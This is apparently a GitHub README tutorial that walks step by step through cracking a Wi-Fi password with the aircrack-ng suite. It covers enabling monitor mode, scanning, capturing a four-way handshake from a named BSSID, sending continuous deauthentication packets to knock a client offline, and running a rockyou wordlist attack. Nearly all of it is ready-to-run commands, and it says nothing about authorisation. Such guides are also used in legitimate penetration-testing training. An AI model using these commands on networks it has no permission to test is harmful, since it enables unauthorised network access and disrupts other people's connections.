# Setting up aircrack-ng

```
sudo apt install -y aircrack-ng
```

### Display current wireless network configurations

```
iwconfig
```

![image](https://github.com/user-attachments/assets/3a5c15b7-687d-4ba8-82be-270cde718563)

### If using virtual machine and no wlan0 is present

<ul>
  <li>Attach the USB wireless adapter</li>
  <li>use <code>lsusb</code> command to confirm detection
  </li>
</ul>

### Lists detailed capabilities of your wireless adapter, including whether ‘monitor’ mode is supported.

```
iw list
```

![image](https://github.com/user-attachments/assets/ad0e5dab-4a03-4faf-9a56-bef3f82571a0)

![image](https://github.com/user-attachments/assets/a2ad74a7-f195-46d7-a720-4ffb4a70d54e)

### Checks for processes that might interfere with monitor mode, like network managers.

```
airmon-ng check
```

![image](https://github.com/user-attachments/assets/479e6d24-7133-4170-a194-81297cbdc827)

### Kills those interfering processes to enable monitoring mode safely without conflicts

```
airmon-ng check kill
```

# Enabling monitor mode

### To capture packets, your wireless adapter must be in monitor mode.

```
sudo airmon-ng start wlan0
```

### Verify wlan0 is in monitor state

```
sudo iwconfig
```

![image](https://github.com/user-attachments/assets/37f42f98-1b46-4792-8a55-733e1217ccaf)

# Scan Wi-Fi networks

```
sudo airodump-ng wlan0mon
```

![image](https://github.com/user-attachments/assets/842fc0f9-53c7-44a5-b478-7f3582b99650)

# Capturing handshake packets

### To crack specified network, you need to capture four-way handshake of network

```
sudo airodump-ng -c 10 --bssid 52:2B:6D:DA:57:B5 -w capture wlan0mon
```

![image](https://github.com/user-attachments/assets/fcdbb438-99b5-4bf2-98d8-311b84e42879)

<ol>
  <li>-c [channel] specifies the channel of the target network</li>
  <li>--bssid [target-BSSID] filters packets to capture traffic only from the selected access point</li>
  <li>-w capture saves the captured data to a file named capture-01.cap</li>
</ol>

### To speed up capturing the handshake process, de-authenticate a connected client

```
sudo aireplay-ng --deauth 0 -a 52:2B:6D:DA:57:B5 -c 4E:30:46:88:C4:44 wlan0mon
```

![image](https://github.com/user-attachments/assets/b13ed2a8-4f40-4f3b-83fa-dee0de95460d)

<ol>
  <li>–deauth 0 sends deauthentication packets continuously until manually stopped</li>
  <li>-a <target-BSSID> targets the WiFi network</li>
  <li>-c <client-MAC> specifies the client device to disconnect</li>
</ol>

# Cracking the Wi-Fi password

### With the handshake captured, attempt to crack password using circrack-ng

```
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

![image](https://github.com/user-attachments/assets/93ef7ad8-a26c-480a-a49e-602f6f8e12bf)

![image](https://github.com/user-attachments/assets/34a3c34f-b1f1-4c71-b94f-85f732338c57)

<ol>
  <li>-w [path to wordlist] specifies the wordlist to use for the attack.</li>
  <li>capture-01.cap is the file containing the captured handshake.</li>
</ol>
